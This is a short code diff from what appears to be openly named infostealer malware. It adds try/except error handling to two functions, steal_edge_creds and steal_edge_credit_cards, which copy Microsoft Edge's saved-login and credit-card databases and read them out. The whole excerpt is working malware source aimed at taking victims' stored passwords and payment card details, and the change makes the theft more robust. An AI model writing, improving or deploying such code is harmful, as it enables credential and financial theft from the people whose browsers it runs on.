@@ -95,15 +95,24 @@ def __get_edge_credit_cards(cur):
 
 
 def steal_edge_creds(): # get edge credentials
-    __copy_db_file(__EDGE_CREDS_ORIGINAL_FILE, __EDGE_CREDS_COPY_FILE)
-    con, cur = __open_db_connection(__EDGE_CREDS_COPY_FILE)
-    edge_creds = __get_edge_creds(cur)
-    con.close() # Close SQLite3 connection
-    return edge_creds
+    try:
+        __copy_db_file(__EDGE_CREDS_ORIGINAL_FILE, __EDGE_CREDS_COPY_FILE)
+        con, cur = __open_db_connection(__EDGE_CREDS_COPY_FILE)
+        edge_creds = __get_edge_creds(cur)
+        con.close() # Close SQLite3 connection
+    except:
+        edge_creds = "Failed to steal edge creds"
+    finally:
+        return edge_creds
+    
 
 def steal_edge_credit_cards(): # get edge credit cards
-    __copy_db_file(__EDGE_CREDIT_CARDS_FILE, __EDGE_CREDIT_CARDS_COPY_FILE)
-    con, cur = __open_db_connection(__EDGE_CREDIT_CARDS_COPY_FILE)
-    credit_cards = __get_edge_credit_cards(cur)
-    con.close() # Close SQLite3 connection
-    return credit_cards
+    try:
+        __copy_db_file(__EDGE_CREDIT_CARDS_FILE, __EDGE_CREDIT_CARDS_COPY_FILE)
+        con, cur = __open_db_connection(__EDGE_CREDIT_CARDS_COPY_FILE)
+        credit_cards = __get_edge_credit_cards(cur)
+        con.close() # Close SQLite3 connection
+    except:
+        credit_cards = "Failed to steal edge credit cards"
+    finally:
+        return credit_cards
